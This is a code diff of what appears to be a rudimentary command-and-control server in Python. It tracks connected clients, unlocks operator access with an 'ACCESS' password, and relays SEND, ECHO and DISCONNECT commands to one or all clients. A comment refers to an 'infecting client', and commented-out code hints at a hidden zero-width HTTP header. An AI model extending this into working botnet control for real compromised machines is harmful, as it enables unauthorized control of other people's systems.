@@ -44,19 +44,13 @@ class CommandCenter():
     #     device.send(command)
     
     def excute_command(self, device, command, optional=None):
-        
         if command != "SEND" and command != "DISCONNECT" and command != "ECHO":
             device.send_message(self.menu())
             return
-
+        ###what happans when you send the packet. Does the server communicate back to the infecting client?
         if command == "SEND" and optional != None:
             packet = self.construct_packet(device.ip, command, optional)
-            #device.send_cc_message(packet)
             device.send_message(optional)
-
-        # if command == "SENDP" and optional != None:
-        #     device.send_cc_message(optional)
-
         elif command == "DISCONNECT":
             packet = self.construct_packet(device.ip, command, optional)
             device.close()
@@ -65,15 +59,10 @@ class CommandCenter():
             device.send_message("ECHO")
 
     def command(self, addr, command, optional=None):
-        print("command1")
-        print(addr)
-        print(command)
-        print(optional)
-        print(command != "ECHO")
         if command != "ECHO" and command != "SEND" and command != "DISCONNECT":
             self.menu()
             return
-        print("command2")
+        print("[COMMAND]")
         if addr == "ALL":
             for i in self.client_list:
                 self.excute_command(i,command,optional)
@@ -95,7 +84,7 @@ class ClientInfo():
     def __init__(self, client, address):
         self.elevated = False
         self.client = client
-        self.address = address
+        self.address = list(address)
         self.ip = address[0] 
         self.cc = CommandCenter()
 
@@ -170,41 +159,45 @@ class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 
     def parser(self,message,client_instance):
         print(message)
-        message = message[:100].split()
+        message_list = message.split()
         print(message)
         if message != []:
-            command = message[0]
-            if command == "ACCESS" and len(message) == 2:
-                    client_instance.elevatation(message[1])
+            first = message_list[0]
+            if first == "ACCESS" and len(message_list) == 2:
+                    client_instance.elevatation(message_list[1])
             elif client_instance.elevated:
                 print(client_instance.elevated)
-                if command == "CLIENTS" and len(message) == 1:
+                if first == "CLIENTS" and len(message_list) == 1:
                         self.cc.clients(client_instance)
-                elif command == "COMMAND": 
-                    if len(message) == 3:
-                        print("Commad")
-                        self.cc.command(message[1], message[2])
-                    elif len(message) == 4:
-                        self.cc.command(message[1], message[2], message[3])
-                elif command == "DROP" and len(message) == 1:
+                elif first == "DROP" and len(message) == 1:
                         client_instance.elevatation()
+                elif message_list[1] == "ECHO" or message_list[1] == "SEND" or message_list[1] == "DISCONNECT":
+                    if len(message_list) == 3:
+                        #SEND
+                        self.cc.command(message_list[0], message_list[1], message_list[2])
+                    elif len(message_list) == 2:
+                        #ECHO OR DISCONNECT
+                        self.cc.command(message_list[0], message_list[1])
 
 
     def listenToClient(self, client, address):
         size = 1024
         client_instance = ClientInfo(client, address)
         self.cc.insert(client_instance)
-        print("ADDED CLIENT: " + client_instance.ip)
+        print("ADDED CLIENT: ")
+        print(str(client_instance.address))
         while True:
             #client_instance.send_message("Hello from Server")
-            #packet = HTTP()/HTTPRequest(Referer="\u200d")
+            #packet = HTTP()/HTTPRequest(Referer=
+            # "\u200d")
             #p = bytes(packet)
             #client.send(p)
             time.sleep(2)
-            data = client.recv(size)
-            data = data.decode()
-            if data:
+            packet = client.recv(size)
+            #data = data.decode()
+            if packet:
                 #Set the response to echo back the recieved data 
+                data = deconstruct_packet(packet)
                 self.parser(str(data), client_instance)
             else:
                 raise print('Client disconnected')
